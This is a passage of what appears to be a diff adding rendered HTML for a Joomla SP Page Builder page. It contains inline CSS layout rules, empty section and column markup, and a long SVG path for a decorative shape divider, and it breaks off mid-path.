+@media (max-width: 1199.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block .sppb-addon-content{}}
+@media (max-width: 991.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block .sppb-addon-content{}}
+@media (max-width: 767.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block .sppb-addon-content{}}
+@media (max-width: 575.98px) {#sppb-addon-1691918604566 .sppb-addon-text-block .sppb-addon-content{}}</style></div></div></div></div></div></div></div></div><section id="section-id-1708426369703" class="sppb-section sppb-section-content-center" ><div class="sppb-row-container"><div class="sppb-row sppb-align-center"><div class="sppb-row-column  " id="column-wrap-id-1708426369702"><div id="column-id-1708426369702" class="sppb-column " ><div class="sppb-column-addons"></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1708426369780"><div id="column-id-1708426369780" class="sppb-column " ><div class="sppb-column-addons"></div></div></div><div class="sppb-row-column  " id="column-wrap-id-1708426369781"><div id="column-id-1708426369781" class="sppb-column " ><div class="sppb-column-addons"></div></div></div></div></div></section><style type="text/css">.sp-page-builder .page-content #section-id-1691918112835{box-shadow:0px 0px 0px 0px #FFFFFF;}.sp-page-builder .page-content #section-id-1691918112835{padding-top:10px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#column-id-1691918112832{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112832{max-width:25%;flex-basis:25%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112832{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112832{max-width:100%;flex-basis:100%;}}#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112833{max-width:50%;flex-basis:50%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112833{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112833{max-width:100%;flex-basis:100%;}}#column-id-1691918112834{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}@media (max-width:1199.98px) {#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}}@media (max-width:991.98px) {#column-wrap-id-1691918112834{max-width:25%;flex-basis:25%;}}@media (max-width:767.98px) {#column-wrap-id-1691918112834{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1691918112834{max-width:100%;flex-basis:100%;}}.sp-page-builder .page-content #section-id-1708426369703{box-shadow:0px 0px 0px 0px #FFFFFF;}.sp-page-builder .page-content #section-id-1708426369703{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;}#column-id-1708426369702{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369702{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369702{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369702{max-width:100%;flex-basis:100%;}}#column-id-1708426369780{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369780{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369780{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369780{max-width:100%;flex-basis:100%;}}#column-id-1708426369781{box-shadow:0 0 0 0 #FFFFFF;}#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}@media (max-width:1199.98px) {#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:991.98px) {#column-wrap-id-1708426369781{max-width:33.333333%;flex-basis:33.333333%;}}@media (max-width:767.98px) {#column-wrap-id-1708426369781{max-width:100%;flex-basis:100%;}}@media (max-width:575.98px) {#column-wrap-id-1708426369781{max-width:100%;flex-basis:100%;}}</style>	</div>
+</div></div></div></div></div></div>
+				
+	</section>
+
+<section id="sp-main-body" >
+
+				
+	
+<div class="row">
+	
+<div id="sp-component" class="col-lg-12 ">
+	<div class="sp-column ">
+		<div id="system-message-container" aria-live="polite">
+	</div>
+
+
+		
+		<div id="sp-page-builder" class="sp-page-builder  page-1" x-data="easystoreProductList">
+
+	
+	<div class="page-content" x-data="easystoreProductDetails">
+				<div id="section-id-1680963163511" class="sppb-section sppb-section-content-center" ><div class="sppb-shape-container sppb-top-shape "><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 90" preserveAspectRatio="none">
+  <path d="M0 0v43.3h.6c0 .1-.1.2 0 .3 0 .2.1.3.3.2.3-.1.6-.1.9-.1.3 0 .5 0 .8-.1v.1c.7 0 1.6.4 2.8.4V44h.3c.2 0 .4 0 .6.3 0 .1.1.1.2 0s.1-.2 0-.3c-.2-.4-.5-.4-.8-.5h-.1c-.1-.2-.2-.3-.3-.4.6.1 1.3.1 1.7 0-.1-.4-.6-.7-1-1.1.1-.7-.6-1.7 1.5-1.9.1.3.3.7.4 1.1H8c0 .1-.1.2-.1.3v.1c-.1 0-.1.2-.1.3 0 .1.1.2.2.2h.1c-.2 0-.2-.1-.1-.3v-.1c.2.2.3.4.6.5.1 0 .1-.1.2-.2 0-.1 0-.2-.1-.2-.2-.1-.3-.2-.5-.5h.1c1-.1 1.8 0 1.6 1.1.8.4 1.5.8 2.6.7.3 0 .6-.6.9 0-.4 1.4-1.2.8-2.1 1.3-.4.1-.9.1-1.3 0-.4-.6-1.4-.9-1.7.2.3.2.7.4 1.3.4v-.1c.5.2 1 .1 1.5.1 0 .5 1.1-.1.6.6.9.3.9-.6 1.7-.4.6 1.1 2.5.4 3.3 1.3 0-.4.2-.4.3-.6 0 .3 1 .3.6 0-.2 0-.3 0-.4-.1 0-.1 0-.1-.1-.1H17c.1-.9-.1-1.5-.3-1.9.4-.5.7-.8 1.4-1.1-.1 1.3 1.4 1.2.7 2.8-.1 0-.1.1-.2.1-.1.1-.1.2-.1.4s.2.2.3.2l.1-.1c1.1.6 2 .4 3.1.4.2.1.4.1.6.1.3.1.4.5.7.6 0-.2 0-.4.1-.4.6.2 1.1.2 1.5.2h.4c1.6.4 2.8.9 4.3.7v.4c.5-.2.7 0 1-.6 1.4.6 3 1.2 3.8 0 1 1.9 2.9-.4 3.6 1.7 1.1.3 2.1-.6 2.9-.4.5.1 1.1 1.2 1.7.4.4 1 1.2.2 1.8.9 1.1-1.4 2.6 1.1 4.3.7.3.2.5.2.7.2.2 0 .4 0 .5.1.1.1.2 0 .2-.2 0-.1 0-.3-.1-.3-.2-.1-.4-.1-.7-.1-.2 0-.5 0-.6-.1v-.1c.7-1 1.8-.3 3.3-.6.2.5.4 1 .3 1.9.9-.8 1.5.5 2.4.2.2-.8 0-1 .4-1.5.9 0 1.6.8 1.4 1.9.9-.3 2.4 1.2 3.1-.4.4.8 1.1 1.2 1.8 1.5v-.1c.2.1.4.1.6 0v.1c0 .5.6.1.9.2v-.1c.5-.1 1 .1 1.5.3.6.2 1.3.5 1.9.2.1 0 .2-.2.2-.4s-.1-.3-.2-.2c-.5.2-1.1 0-1.7-.2-.4-.2-.9-.3-1.4-.3h-.1c-.1-.5-.8-.5-1.1 0h-.5v-.1c-.3-.9-.6-1.7-1.1-2.2 1.3-.8 1.7 1.3 3 1.3.1-.3-.2-1.1.1-1.1 2.4.4 3.6 1.2 5.8 2 0-.4.4-.4.6-.6 1 1.2 2.7 1.1 3.6.5v.9c1.1-.5 1.5.5 1.7 1.9 1.3 0 2.8.8 4.3.2.3.8.7.4 1.3.9.5-.8-.4-2.2.3-2.6 0 .2.1.3.3.4 0 .1 0 .2.1.3 0 1.1-.1.9-.2 1.7 1.5-.9 3.5.8 4.3.9.8.1 2.5-.9 3 0 .6-.5 1 .3 1.3.9.7-.2 1.6.4 2.4 0 .4 1 1.7.5 2.7.7v-.2c.6-.2 1.3-.1 1.8.1.8.8 2-.4 2.9.3-.1-.8 1.1-.5.9.2 1-.1 1.4.3 2-.2-.1.6 1 .5 1.4.2.9.6 1.6.4 3 .7 0-.6.2-.7.6-.6v.6c1.5-.1 3.3.6 4.3.7-.5-.4 1.1-.2 1.1-.2v.4c1.1.2 2.1.2 2.9-.8-1.3.2-1-2.5-.7-3.2.4.6 1.2.7 1.6.4-.5.2-.1-.6 0-.6.9 2 3.7-.1 4 2.8-.3.3-.9.2-1 .9.5.6 1.5.6 1.9-.2.6.2 1.6.7 2 0-.2-.1-.3-.3-.4-.6.6-.2 1.4 0 1.9-.9-.2 0-.5 0-.4-.4.6-.2.7.5 1.1.7.2-.5.3-1.2.9-1.1.2.5.7.4.6 1.3.6-.3.9.9 1.4.4-.4-.1.6-.8 0-1.1.1.4-.5 0-.6-.2.7-.4.5-.2 0-.6 1.2 0 2.3 0 2.6 1.3 1.9 0 3.5.5 5.1-.4 0-.6-.5-.7-.1-1.3-.5 0-1 .1-1-.7.4.1.5-.4 1-.2-.1-.7.3-.8.2-1.5 1.6-.5 2.8-.8 4.3 0 .4 1.1-.3 1.8-.4 2.2.5 0 .9 0 1 .2-.2.3-.2.5 0 .9 1 .5 1.9-1.1 2.6-.4 0-.4.2-.4.3-.6-.5-.5-1.3-1.5-2-1.5 2.3-2.1 5.1-1 8.3-2.3.5.7 1.3 0 1.6.4 0 1-.4 1.4-.6 2.2 1 1.1 2.3-.5 3.3.4.4-.2.5-1 .9-1.3 1 .2 1.6 1 2.3 0 .5 1.4 1.8-.4 2.7.2.3-.4.4-.9.9-1.1 1.1 1 3.4.8 4.4-.4.5 1.2 2.2.3 2.7.4.7-2.1 2.3-.7 3.7-1.1-.1.6.3.4.3.9h1.1c.3-1.2 2-1.6 2.9-1.1.2.1.4.7.7.9.8.4 1.9.6 2.4-.2.5.7 1.1-.1 2.3.2.1.3.2.7.6.6 1.2-.5 2.4.1 3.3-.8 2.7 1.1 6.7 0 9.4.1.1-.3.4-.4.6-.6 1.6.7 5.3.1 7.1-1.5 1 1.4 3.8-2.1 4.4.7.8.4 1.5-.3 2-.8 1.2 1 1.9-1.2 3-.4.1-.6.7-.4.9-.9 2.4-.4 3.5-2.7 5-4.5h.7c1.2-.1 2.6-.7 3.7-.6.3 0 .6-.2.7-.2.7 0 1.4.3 2.3.2 2.1-.2 3.1-.2 4.1-.1 0-.4.2 0 .4-.2.7.3 1.6-.1 2.5-.1 1.6 0 4 0 5.6-.1.3 0 .7-.3 1-.3.8 0 1.5.2 2.2.1.2 0 .3-.2.5-.2.6 0 1.4.2 2.1.1 1.1-.1 2.1-.8 3-.2.2-.1.3-.3.7-.3 2.3.1 2.6.1 4.5-.1.1.2.4.3.7.4 1.5-.8 3.7.7 5.1-.3 1.5.2 3 .2 4.2-.1.1.1 1 .2 1 .1-.1 0-.1-.1.1-.1v-.1c.1.1.3.1.4.1h.1s.1 0 .1-.1c0 0 0-.1-.1-.1h-.4c0-.3-.3-.4-.5-.5v-.1-.1c.2 0 .4 0 .4-.1-.1 0-.3 0-.3-.1.5-.2.4-.4.1-.7.7-.1.6.3 1.1.3 1.3-.4 1.4.5 2.6.5 0-.3-.1-.7.3-.7.3.1.5.4.3.6.6.1.6-.2 1-.3.5.2 1.5.3 2.1.1.2 1.3 2.8.7 4.1.4.3 0 .1.3.4.3 0-.3.5-.4.8-.5.2.1.7 0 .7.3 1.2-.6 2.5-.1 3.7.1.9-.4 1.9.1 2.6.1 1.2.1 2.3-.3 3.1.4.5-.2 1.3-.2 1.8-.4-.5 0-.7-.3-.7-.7.8-.3 1.5.3 2.3 0 1.3.6 4.7.4 6.2 1.4-.2 0-.6.3-.3.4.1-.4.9.3 1.4 0V44c.1 0 .1.1.2.1h.1s0-.1-.1-.1h-.1c.1-.4-.2-.1-.3-.3.7-.4 1.9-.1 2.2.1l-.3.1c.5.3.9.1 1.1.5.8-.2 1.7-.3 2.2.1.3 0 .4-.2.8-.1 1.4.6 4.5.7 5.9.6 1.2.5 3.2 1 5.1 1.4.6.1.9.2 1.2.2.4.1.9 0 1.4 0 2 .1 3.8.7 5.6.6 1.9.5 4 .2 6 .1.8 0 1.7.2 2.5.1.2 0 .4-.2.5-.2 2.8 0 5.7.3 8.4.1.1.1.2.2.4.2 1.6.1 2.7-.5 4.5-.1 0-.1 0-.2.3-.2 1.9.3 4.2 0 6.7 0 .4-.6 1.5.1 1.8-.3-.3 0 0-.3.1-.3 1 .2 1.3-.2 2.5-.1.4-.8 1.7-.9 2.6-1.2.4.2.6.5 1.1.3.2-.3-.4-.1-.3-.4.4-.1 1 .1 1.2-.3-.2 0-.3 0-.3-.2-3.2-.1-5.3-.4-7.7-.8.8 0 .9.2 1-.2 1 .5 1.9.3 2.7.4-.2 0-.2-.2-.3-.3.2.1.3.3.8.2.3-.3-.2-.3 0-.4.3 0 .3.6.5.2-.2 0-.2-.1-.3-.2.6.1.5.1.8-.2.5.6 1.2.2 1.8.2 0 .1 0 .1.1.1h.1c0 .1-.1.1-.1.2v.1s0 .1.1.1.1 0 .1-.1v-.1s0-.1.1-.1c.1.1.1.1.2.1h.1v-.1l-.1-.1h.1c.7 0 .7-.5 1.4-.5 3.6.2 7.4.2 11.5 0 2.5.3 5.6-.2 7.5-.4h.4c.3 0 .5 0 .5-.2.3-.1.7-.1 1-.1.4 0 .8 0 1.2-.1 0 .1 0 .2.1.2-.1-.3.6.1.5-.2.3.1.5 0 .8 0h.2c.4.1 1.5-.1 2.2-.1-.2-.7-2-.8-2.3-.1h-.2c-.2 0-.4.1-.6 0-.1-.1-.3-.2-.5-.2 0 .2-.3.1-.4.2-.3.1-.7.1-1 .1-.4 0-.8 0-1.2.1-.1-.1-.8-.2-.6.1h-.1c-.2-.4-.7 0-1.1 0-.6 0-1.3-.2-1.8-.1-.2 0-.2.5-.5.3-1.3-.2-2.8.1-4.1.2h-.1c-4.1.2-7.9.3-11.5 0-.2-.1-.6 0-.5-.4.5-.4.1-.7 0-1.4-1.6-.3-2.7-1-3.8-1.6.5-.5.9-.4 1.8-.3 0 .3.2.4.1.8h.7c-.1-.4.1-.5.4-.6.6.1.6.7 1.2.8.2-.3 1.1-.2 1.4-.6.2.3.8.3 1.4.4.2-.4.3-.8-.3-1.2 1.7-.4 2.6.3 2.9 1.2.8 0 1.1 0 1.8-.3.6.2 1.3.1 1.6-.3.8 0 1.1-.4 1.5-.6-.4-.1-1-.1-1.1-.4 2.1.1 3.7-.4 4.8.5-.4 0-.6.2-1 .2v.3c-.2 0-.3.1-.6 0l-.1-.1c-.1-.1-.2-.3-.5-.3-.1 0-.2.1-.2.1 0 .1.1.2.2.2s.1 0 .2.1l.3.3c.2 0 .6.1.9 0 0 0 .1 0 .1-.1.2-.1.4-.1.7 0 .1-.2.2-.4.6-.5.5.1 1.2 0 1.2.4 1.2.1 1.6-.4 2.2-.7-.3 0-.1-.3 0-.4h.6c0 .1.2.2.3.3-.2 0-.4 0-.4.1.9.6 2.1.3 3.2 0 .1-.4-.5-.3-.4-.6.7-.2 1.7-.1 1.9.3.5-1 1.7-.4 2.6-.1 1-.5 3.3-.3 3.6-1.1 1 .6 2.3.1 3.4 0 1.5-.1 3-.1 4.4-.5-.2-.1-.3-.3-.3-.5-.5-.1-.7.1-1.1.1-1.4-.5-2.3.4-3.3-.3.2 0 .2-.2.4-.2 2.1-.1 4.3-.1 5.3-1h1.4c.1 0 .2-.1.2-.2s-.1-.1-.2-.1h-1.3c-.3-.1-.4-.5-.7-.4-.1.2-.1.3 0 .4-2.9.1-6.2.5-8.3.3-.2.1 0 .4-.3.4-.8-.3-1.3-.1-2.1 0-.6.1-1.4-.1-1.8 0-.3.1-.4.3-.7.3-.6 0-1.4-.1-1.8-.5 1.3-.1 2.3-.4 3.7-.5 1.1-.6 3.6.1 5.5-.4.3-.2-.2-.3.3-.4 1.4-.1 3.7.7 4.9-.2h.3c.1 0 .1 0 .1-.1 0 0 0-.1-.1-.1s-.3 0-.4-.1c-.1-.1-.2-.1-.3-.1.1-.1.2-.2.3-.2h.6c1.6.9 3.5.7 4.7 1.7-.4 0-.4.3-.7.4-.1 0-.1 0-.2-.1-.1 0-.2.1-.2.3 0 .2.1.3.2.4.1 0 .2 0 .3.1.1 0 .1 0 .2-.1.8 0 1.6.3 2.4.6 0 0 0 .1.1.1h.1c.1.1.3.1.4.1h.1l.1-.1c.1.1.3.1.5.2h.1c.1.5.5.4.8.6.1-.8.7-.9 1.1-.6v-.1c.2 0 .3.1.5.1.4.1.8.3 1.2 0 .2.4.5.5.8.5h.2c.2.5.5.8 1.1.8.1-.8 0-1 .2-1.5-.4-.3-.8-.1-1.1.2v.1h-.3c-.3 0-.5 0-.6-.4l-.1-.3-.2.2c-.3.3-.7.2-1.1.1-.1 0-.3-.1-.4-.1.1-.2.1-.3 0-.5.2 0 .4 0 .4-.2-.2-.3-.6-.1-.8-.4V35c0-.1 0-.1-.1-.1l-.1.1v.1c-.1 0-.2 0-.1-.2.3-.9 1.1-.5 2.1-.6 0-.2 0-.4.1-.4 1-.6 3.5.1 4.4.9.7-.2 1.3.1 2.3 0 .2 1.1.4.3 1.3.4v-.1c.2.1.3.1.5.1.1 0 .1-.1.1-.2s-.1-.2-.2-.2h-.3c.2-.7 0-1 0-1.9.1-.5 1.2.4.9-.2-.3.1-.5-.1-.6-.4.6-.4 1.7-.3 1.8 1.1-.1 0-.3 0-.3.2.4.7.8 1.4 1 2.4h.1c0 .1-.1.2-.1.3v.1c-.1 0-.1.2-.1.3 0 .1.1.2.2.2h.1c.1-.1.1-.2.2-.4v-.1c.2.2.3.4.6.5.1 0 .1-.1.2-.2 0-.1 0-.2-.1-.2-.2-.1-.3-.2-.5-.5h.1c1-.1 1.8 0 1.6 1.1.8.4 1.5.8 2.6.7.3 0 .6-.6.9 0-.4 1.4-1.2.8-2.1 1.3-.4.1-.9.1-1.3 0-.4-.6-1.4-.9-1.7.2.5.1 1 .4 1.6.4v-.1c.5.2 1 .1 1.5.1 0 .5 1.1-.1.6.6.9.3.9-.6 1.7-.4.6 1.1 2.5.4 3.3 1.3 0-.4.2-.4.3-.6 0 .3 1 .3.6 0-.2 0-.3 0-.4-.1 0-.1 0-.1-.1-.1h-.1c.1-.9-.1-1.5-.3-1.9.4-.5.7-.8 1.4-1.1-.1 1.3 1.4 1.2.7 2.8-.1 0-.1.1-.2.1-.1.1-.1.2-.1.4s.2.2.3.2l.1-.1c1.1.6 2 .4 3.1.4.2.1.4.1.6.1.3.1.4.5.7.6 0-.2 0-.4.1-.4.4.1.9.2 1.3.2h.4c1.6.4 2.8.9 4.3.7v.4c.5-.2.7 0 1-.6 1.4.6 3 1.2 3.8 0 1 1.9 2.9-.4 3.6 1.7 1.1.3 2.1-.6 2.9-.4.5.1 1.1 1.2 1.7.4.4 1 1.2.2 1.8.9 1.1-1.4 2.6 1.1 4.3.7.2.1.5.1.7.1.2 0 .4 0 .5.1.1.1.2 0 .2-.2 0-.1 0-.3-.1-.3-.2-.1-.4-.1-.7-.1-.2 0-.5 0-.6-.1v-.1c.7-1 1.8-.3 3.3-.6.2.5.4 1 .3 1.9.9-.8 1.5.5 2.4.2.2-.8 0-1 .4-1.5.9 0 1.6.8 1.4 1.9.9-.3 2.4 1.2 3.1-.4.4.8 1.1 1.2 1.8 1.5v-.1c.2.1.4.1.6 0v.1c0 .5.6.1.9.2V48c.5-.1 1 .1 1.5.3.6.2 1.3.5 1.9.2.1 0 .2-.2.2-.4s-.1-.3-.2-.2c-.5.2-1.1 0-1.7-.2-.4-.2-.9-.3-1.4-.3h-.1c-.1-.5-.8-.5-1.1 0h-.5v-.1c-.3-.9-.6-1.7-1.1-2.2 1.3-.8 1.7 1.3 3 1.3.1-.3-.2-1.1.1-1.1 2.4.4 3.6 1.2 5.8 2 0-.4.4-.4.6-.6 1 1.2 2.7 1.1 3.6.5v.9c1.1-.5 1.5.5 1.7 1.9 1.3 0 2.8.8 4.3.2.3.8.7.4 1.3.9.5-.8-.4-2.2.3-2.6 0 .2.1.3.3.4 0 .1 0 .2.1.3 0 1.1-.1.9-.2 1.7 1.5-.9 3.5.8 4.3.9.8.1 2.5-.9 3 0 .6-.5 1 .3 1.3.9.7-.2 1.6.4 2.4 0 .4 1 1.7.5 2.7.7v-.2c.6-.2 1.3-.1 1.8.1.8.8 2-.4 2.9.3-.1-.8 1.1-.5.9.2 1-.1 1.4.3 2-.2-.1.6 1 .5 1.4.2.9.6 1.6.4 3 .7 0-.6.2-.7.6-.6v.6c1.5-.1 3.3.6 4.3.7-.5-.4 1.1-.2 1.1-.2v.4c1.1.2 2.1.2 2.9-.8-1.3.2-1-2.5-.7-3.2.4.6 1.2.7 1.6.4-.5.2-.1-.6 0-.6.9 2 3.7-.1 4 2.8-.3.3-.9.2-1 .9.5.6 1.5.6 1.9-.2.6.2 1.6.7 2 0-.2-.1-.3-.3-.4-.6.6-.2 1.4 0 1.9-.9-.2 0-.5 0-.4-.4.6-.2.7.5 1.1.7.2-.5.3-1.2.9-1.1.2.5.7.4.6 1.3.6-.3.9.9 1.4.4-.4-.1.6-.8 0-1.1.1.4-.5 0-.6-.2.7-.4.5-.2 0-.6 1.2 0 2.3 0 2.6 1.3 1.9 0 3.5.5 5.1-.4 0-.6-.5-.7-.1-1.3-.5 0-1 .1-1-.7.4.1.5-.4 1-.2-.1-.7.3-.8.2-1.5 1.6-.5 2.8-.8 4.3 0 .4 1.1-.3 1.8-.4 2.2.5 0 .9 0 1 .2-.2.3-.2.5 0 .9 1 .5 1.9-1.1 2.6-.4 0-.4.2-.4.3-.6-.5-.5-1.3-1.5-2-1.5 2.3-2.1 5.1-1 8.3-2.3.5.7 1.3 0 1.6.4 0 1-.4 1.4-.6 2.1 1 1.1 2.3-.5 3.3.4.4-.2.5-1 .9-1.3 1 .2 1.6 1 2.3 0 .5 1.4 1.8-.4 2.7.2.3-.4.4-.9.9-1.1 1.1 1 3.4.8 4.4-.4.5 1.2 2.2.3 2.7.4.4-1.1 1-1.2 1.7-1.1h.1c.5.1 1 .2 1.5.1.1 0 .3 0 .4.1 0 .4.3.3.3.7h1.1c0-.2.1-.3.2-.4.3 0 .6.1.9.1.1-.5.5-.1.8-.1 0 0 0-.2.1-.2h1.1c.1.2.2.3.3.4.7.4 1.9.6 2.4-.2h.1c.5.6 1.1-.1 2.3.2.1.3.2.7.6.6.7-.3 1.5-.2 2.1-.3.4 0 .8 0 1.1-.2 0 .1-.2.2 0 .3-.1-.3.3-.2.4-.3.8.6 2.3.1 2.9.7.2-.2.9.2.8-.2 0 .1.3.1.4.2.1-.4.8.1 1.1-.3 0 .1-.2.2-.3.3.3 0 .3-.1.5-.1.1.1.1.1.2.1h.5v-.1h-.4l-.1-.1h.1c.4-.3.9.1 1.6.2 0-.2.5-.1.8-.1.2 0 1.1.3 1.1 0 .7.4 1.8.1 2.7.1.9.1 2 .3 3 .3l.1-.2c.3-.1 1 .3 1-.1.1.1.6.3.7.1-.1 0-.3-.2-.1-.2.7.3 1.4 0 2.1.3 0-.1 0-.3.1-.3 2.6.4 3.2 0 4.9.4 0-.3 1.4.1 1.5-.4.1.4.8.1.4.4 1.3 0 2.1 0 2.9-.2.5.4 1.3.3 2.2.2h2.3c.2 0 .4-.2.7-.2.8 0 1.9.2 3 .1 1.9-.1 5.1.1 6.6-.3.2 0 .2-.2.4-.2 1.2-.1 3.5.4 3.4-.1 2.1.4 3.8-.1 5.8-.1h3.4c.1 0 .2 0 .2-.1s-.1-.1-.2-.1h-3.5c-1-.3-2.1 0-2.8-.2V48h.2s.1 0 .1-.1c0 0 0-.1-.1-.1h-.3v.1c-.1 0-.2.1-.3.1.1-.2-.4-.4-.4-.2.2 0 .2.1.3.2-.7 0-1.4-.1-1.9-.2s-1.4-.1-2.2-.2c-.9-.1-1.8-.2-1.6 0-.1-.2-.4-.3-.7-.4.2.5-.6.5-1 .4.7 0 .5-.6 1-.7.5.1 1.3.3 1.2.6 0-.2.5-.1.5-.2 2.6.4 5.2-.3 7.7-.3 2.2 0 4.9.2 7.1-.2.7-.1 1.3-.4 1.9-.5.7-.1 1.5 0 2.2 0v.2c.4.1.2-.3.5-.3 2.1.5 3.8 1.5 6.9 1.6 0 0-.1 0-.1.1 0 0 .1.1.1 0h.1c.1 0 .2 0 .3-.1v.1c.8-.1.9.4 1 0 .2.2.6.2.8.2 2.2 0 4.3-.4 6.4-.4.8 0 2 .2 2.7.1 1.2-.1 2.6-.7 3.7-.6.3 0 .6-.2.7-.2.7 0 1.4.3 2.3.2 2.1-.2 3.1-.2 4.1-.1 0-.4.2 0 .4-.2.7.3 1.6-.1 2.5-.1 1.6 0 4 0 5.6-.1.3 0 .7-.3 1-.3.8 0 1.5.2 2.2.1.2 0 .3-.2.5-.2.7 0 1.4.2 2.1.1 1.1-.1 2.1-.8 3-.2.2-.1.3-.3.7-.3 2.3.1 2.6.1 4.5-.1.1.2.4.3.7.4 1.5-.8 3.7.7 5.1-.3 1.5.2 3 .2 4.2-.1.1.1 1 .2 1 .1-.1 0-.1-.1.1-.1v-.1c.1.1.3.1.4.1h.1s.1 0 .1-.1c0 0 0-.1-.1-.1h-.4c0-.3-.3-.4-.5-.5V45v-.1c.2 0 .4 0 .4-.1-.1 0-.3 0-.3-.1.5-.2.4-.4.1-.7.7-.1.6.3 1.1.3 1.3-.4 1.4.5 2.6.5 0-.3-.1-.7.3-.7.3.1.5.4.3.6.6.1.6-.2 1-.3.5.2 1.5.3 2.1.1.2 1.3 2.8.7 4.1.4.3 0 .1.3.4.3 0-.3.5-.4.8-.5.2.1.7 0 .7.3 1.2-.6 2.5-.1 3.7.1.9-.4 1.9.1 2.6.1 1.2.1 2.3-.3 3.1.4.5-.2 1.3-.2 1.8-.4-.5 0-.7-.3-.7-.7.8-.3 1.5.3 2.3 0 1.3.6 4.7.4 6.2 1.4-.2 0-.6.3-.3.4.1-.4.9.3 1.4 0v-.1c.1 0 .1.1.2.1h.1s0-.1-.1-.1h-.1c.1-.4-.2-.1-.3-.3.7-.4 1.9-.1 2.2.1l-.3.1c.5.3.9.1 1.1.5.8-.2 1.7-.3 2.2.1.3 0 .4-.2.8-.1 1.4.6 4.5.7 5.9.6 1.2.5 3.2 1 5.1 1.4.6.1.9.2 1.2.2.4.1.9 0 1.4 0 2 .1 3.8.7 5.6.6 1.9.5 4 .2 6 .1.8 0 1.7.2 2.5.1.2 0 .4-.2.5-.2 2.8 0 5.7.3 8.4.1.1.1.2.2.4.2 1.6.1 2.7-.5 4.5-.1 0-.1 0-.2.3-.2 1.9.3 4.2 0 6.7 0 .4-.6 1.5.1 1.8-.3-.3 0 0-.3.1-.3 1 .2 1.3-.2 2.5-.1.4-.8 1.7-.9 2.6-1.2.4.2.6.5 1.1.3.2-.3-.4-.1-.3-.4.4-.1 1 .1 1.2-.3-.2 0-.3 0-.3-.2-3.2-.1-5.3-.4-7.7-.8.8 0 .9.2 1-.2 1 .5 1.9.3 2.7.4-.2 0-.2-.2-.3-.3.2.1.3.3.8.2.3-.3-.2-.3 0-.4.3 0 .3.6.5.2-.2 0-.2-.1-.3-.2.6.1.5.1.8-.2.5.6 1.2.2 1.8.2 0 .1 0 .1.1.1h.1c0 .1-.1.1-.1.2v.1s0 .1.1.1.1 0 .1-.1v-.1s0-.1.1-.1c.1.1.1.1.2.1h.1V46l-.1-.1h.1c.7 0 .7-.5 1.4-.5 3.6.2 7.4.2 11.5 0 2.5.3 5.6-.2 7.5-.4h.4c.3 0 .5 0 .5-.2.3-.1.7-.1 1-.1.4 0 .8 0 1.2-.1 0 .1 0 .2.1.2-.1-.3.6.1.5-.2.3.1.5 0 .8 0h.2c.4.1 1.5-.1 2.2-.1-.2-.7-2-.8-2.3-.1h-.2c-.2 0-.4.1-.6 0-.1-.1-.3-.2-.5-.2 0 .2-.3.1-.4.2-.3.1-.7.1-1 .1-.4 0-.8 0-1.2.1-.1-.1-.8-.2-.6.1h-.1c-.2-.4-.7 0-1.1 0-.6 0-1.3-.2-1.8-.1-.2 0-.2.5-.5.3-1.3-.2-2.8.1-4.1.2h-.1c-4.1.2-7.9.3-11.5 0-.2-.1-.6 0-.5-.4.5-.4.1-.7 0-1.4-1.6-.3-2.7-1-3.8-1.6.5-.5.9-.4 1.8-.3 0 .3.2.4.1.8h.7c-.1-.4.1-.5.4-.6.6.1.6.7 1.2.8.2-.3 1.1-.2 1.4-.6.2.3.8.3 1.4.4.2-.4.3-.8-.3-1.2 1.7-.4 2.6.3 2.9 1.2.8 0 1.1 0 1.8-.3.6.2 1.3.1 1.6-.3.8 0 1.1-.4 1.5-.6-.4-.1-1-.1-1.1-.4 2.1.1 3.7-.4 4.8.5-.4 0-.6.2-1 .2v.3c-.2 0-.3.1-.6 0l-.1-.1c-.1-.1-.2-.3-.5-.3-.1 0-.2.1-.2.1 0 .1.1.2.2.2s.1 0 .2.1l.3.3c.2 0 .6.1.9 0 0 0 .1 0 .1-.1.2-.1.4-.1.7 0 .1-.2.2-.4.6-.5.5.1 1.2 0 1.2.4 1.2.1 1.6-.4 2.2-.7-.3 0-.1-.3 0-.4h.6c0 